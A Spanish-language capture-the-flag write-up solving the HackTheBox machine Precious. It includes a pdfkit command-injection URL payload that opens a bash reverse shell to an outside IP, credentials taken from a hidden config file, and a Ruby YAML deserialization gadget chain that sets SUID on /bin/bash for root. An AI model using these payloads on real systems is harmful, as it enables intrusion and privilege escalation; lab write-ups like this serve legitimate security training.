---
title: HackTheBox - Precious
categories: [Linux]
tags: [HackTheBox]
image: Precious.png 
img_path: /assets/HTB/Precious/
---


En este post voy a explicar como resolver la máquina Precious de [Hack The Box](https://app.hackthebox.com/machines/Precious), en la cual vamos a estar explotando un RCE y para la escalada vamos a estar cargando un archivo malicioso que le dará permisos SUID a la bash

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 20:44 -03
Nmap scan report for 10.10.11.189
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Si intentamos ingresar al servidor web que está corriendo en el puerto 80, nos redirigirá a ```precious.htb```, vamos a agregarlo a nuestro archivo ```/etc/hosts```.

```
$ echo "10.10.11.189   precious.htb" >> /etc/hosts
```

# Enumeración

Al ingresar a ```precious.htb``` veremos esto.

<img src="precious-pagina.png">

Se trata de un convertidor Web a PDF, vamos a montarnos un servidor web con Python para ver si recibimos alguna petición.
```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
<img src="peticion.png">


```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [13/Jan/2023 21:09:15] "GET / HTTP/1.1" 200 -
```

Al darle a ```Submit``` el servidor web nos tramita una petición GET y también nos descarga un ```PDF``` con el contenido de nuestro directorio actual.

```
$ ls -l
rw-r--r-- onyx onyx   tjahioaa0e9xwj4ct8jzavolqclslrtl.pdf
```

Si hacemos uso de ```exiftool```, veremos que el ```PDF``` se crea con ```pdfkit``` de versión ```0.8.6```
```
$ exiftool tjahioaa0e9xwj4ct8jzavolqclslrtl.pdf

ExifTool Version Number         : 12.50
File Name                       : tjahioaa0e9xwj4ct8jzavolqclslrtl.pdf
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2023:01:13 21:09:16-03:00
File Access Date/Time           : 2023:01:13 21:09:16-03:00
File Inode Change Date/Time     : 2023:01:13 21:16:30-03:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Si buscamos en Google vulnerabilidades para esa versión, encontraremos que es ```vulnerable``` a un ```RCE``` y se explota de la siguiente forma.

```http://example.com/?name=#{'%20`sleep 5`'}```

Cambiemos el ```sleep 5``` por una ```Reverse Shell```.

```http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.54/443 0>&1"`'}```

<img src="revshell.png">

# Ganada de acceso

```
$ nc -lvnp 443

Connection from 10.10.11.189:50756
bash: cannot set terminal process group (660): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
ruby
bash-5.1$
```
# Enumeración del sistema

Ingresamos al sistema como el usuario ```ruby```, pero si hacemos un ```ls -l``` en el directorio del usuario ```ruby``` veremos una carpeta oculta llamada ```.bundle``` en el cual hay un archivo que contiene las ```credenciales``` de otro usuario del sistema.
```
bash-5.1$ ls -la

total 28
drwxr-xr-x 4 ruby ruby 4096 Jan 13 19:08 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Jan 13 19:08 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile

bash-5.1$ cat .bundle/*

BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Usemos estas credenciales para conectarnos por SSH como el usuario henry.
```
$ ssh henry@precious.htb

henry@precious.htb's password: Q3c1AqGHtoI0aXAYFH

-bash-5.1$ whoami
henry
```

Si hacemos un ```sudo -l``` para listar los permisos de ```sudoers```, podemos ejecutar un archivo hecho en ```ruby``` como el usuario ```root```.
```
-bash-5.1$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
# Escalada de privilegios

Si leemos el script hecho en ruby que podemos ```ejecutar```, veremos que intentar cargar un archivo llamado ```dependencies.yml```, al cual no le indica ninguna ruta, por ende podemos crearnos un archivo con el mismo nombre y con un ```código malicioso``` para que le dé permisos ```SUID``` a la ```/bin/bash```


```
-bash-5.1$ s cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

```
-bash-5.1$ sudo -u root /usr/bin/ruby /opt/update_dependencies.rb 2>/dev/null
-bash-5.1$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
-bash-5.1$ bash -p
bash-5.1# whoami
root
```
